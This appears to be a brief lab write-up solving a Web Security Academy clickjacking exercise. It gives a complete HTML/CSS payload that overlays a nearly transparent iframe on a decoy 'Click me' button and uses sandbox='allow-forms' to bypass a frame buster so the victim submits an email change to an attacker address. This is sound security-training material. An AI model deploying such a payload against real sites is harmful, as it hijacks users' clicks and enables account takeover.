@@ -1,0 +1,25 @@
+Clickjacking with a frame buster script
+
+Exploit used:
+
+<style>
+   iframe {
+       position:relative;
+       width:700;
+       height: 500;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:450;
+       left:80;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms"
+src="https://ac401fd81ed27f9a80d314d600fa00ab.web-security-academy.net/email?email=hacker@attacker-website.com"></iframe>
+
+The trick is using the sandbox="allow-forms" to bypass the frame buster.
+Remember to tweak the top element until it lines up properly.
